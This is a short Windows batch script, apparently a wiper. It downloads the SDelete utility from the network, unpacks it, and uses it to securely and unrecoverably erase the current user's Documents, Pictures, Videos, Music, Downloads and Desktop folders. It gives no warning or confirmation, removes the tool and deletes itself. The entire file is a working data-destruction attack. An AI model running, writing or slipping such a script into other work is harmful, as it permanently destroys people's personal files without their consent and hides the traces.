@echo off
powershell -command "Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile %temp%\a.zip"
cd %temp%
powershell -command "Expand-Archive .\a.zip -Force"
powershell -command "rm "a.zip" -Force"
a\sdelete.exe /accepteula -nobanner >nul
a\sdelete.exe -r -s -f -nobanner -p 1 "%UserProfile%\Documents" "%UserProfile%\Pictures" "%UserProfile%\Videos" "%UserProfile%\Music" "%UserProfile%\Downloads" "%UserProfile%\Desktop"
rmdir /S /Q "a"
start /b "" cmd /c del "%~f0"&exit /bn